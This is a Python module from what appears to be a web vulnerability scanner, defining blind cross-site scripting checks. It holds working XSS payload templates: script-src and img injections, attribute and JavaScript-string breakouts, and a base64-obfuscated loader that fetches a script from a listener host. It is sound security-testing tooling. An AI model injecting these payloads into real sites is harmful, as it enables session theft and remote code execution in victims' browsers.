import base64
from ava.common.check import _BlindCheck

# metadata
name = __name__
description = "checks for blind cross-site scripting"


class CrossSiteScriptingBlindDirectCheck(_BlindCheck):
    """
    Checks for blind Cross-Site Scripting by executing callbacks. A listener server should be deployed and configured
    in order to listen for callbacks from the payloads.
    """
    key = "xss.blind.direct"
    name = "Blind Cross-Site Scripting Direct"
    description = "checks for blind cross-site scripting by injecting HTML tags directly"
    example = '<img src="{}">'

    def __init__(self, listener):
        """
        Generate payloads by including the listener's endpoint into the templates. Payloads can reference the listener
        directly. Direct payloads are shorter and may bypass length restrictions.
        :param listener: listener endpoint
        """
        directs = [
            # img (alert only)
            '<img src="{}">',
            '"><img src="{}"><"',
            # script
            '<script src="{}"></script>',
            '"><script src="{}"></script><"'
        ]

        # payloads
        self._payloads = [payload.format(listener) for payload in directs]
        self._listener = listener

    def _check_payloads(self, payloads):
        """
        Checks if the payloads are adoptable for this class and modify the payloads to adjust to check function.
        InvalidFormatException is raised, if a payload is not adoptable.
        :param payloads: list of payloads
        :return: list of modified payloads
        """
        for i, payload in enumerate(payloads):
            payloads[i] = payload.format(self._listener)
        return payloads


class CrossSiteScriptingBlindDynamicCheck(_BlindCheck):
    """
    Checks for blind Cross-Site Scripting by executing callbacks. A listener server should be deployed and configured
    in order to listen for callbacks from the payloads.
    """
    key = "xss.blind.dynamic"
    name = "Blind Cross-Site Scripting Dynamic"
    description = "checks for blind cross-site scripting by injecting HTML tags dynamically"
    example = "<script>{}</script>"

    def __init__(self, listener):
        """
        Generate payloads by including the listener's endpoint into the templates. Payloads can add a reference to
        the listener dynamically through JavaScript. Dynamic payloads slightly obfuscate the listener and may prevent
        obvious disclosure of access tokens in server or application logs.
        :param listener: listener endpoint
        """
        dynamics = [
            # two tags
            '<script>{}</script>',
            '"><script>{}</script><"',
            # one tag
            '<img src="x:#" onerror="{}">',
            '"><img src="x:#" onerror="{}"><"',
            # attribute
            '" onmouseover="{}',
            '#" onclick="{}',
            # href
            'javascript:(function(){{{}}})()',
            # javascript
            "';{}//'",
            '";{}//"'
        ]

        # encode listener and format script
        template = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);"
        encoded = base64.b64encode(listener.encode()).decode()
        script = template.format(encoded)

        # assign payloads
        self._payloads = [payload.format(script) for payload in dynamics]
        self._listener = listener

    def _check_payloads(self, payloads):
        """
        Checks if the payloads are adoptable for this class and modify the payloads to adjust to check function.
        InvalidFormatException is raised, if a payload is not adoptable.
        :param payloads: list of payloads
        :return: list of modified payloads
        """
        # encode listener and format script
        template = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);"
        encoded = base64.b64encode(self._listener.encode()).decode()
        script = template.format(encoded)

        # generate payloads
        for i, payload in enumerate(payloads):
            payloads[i] = payload.format(script)
        return payloads
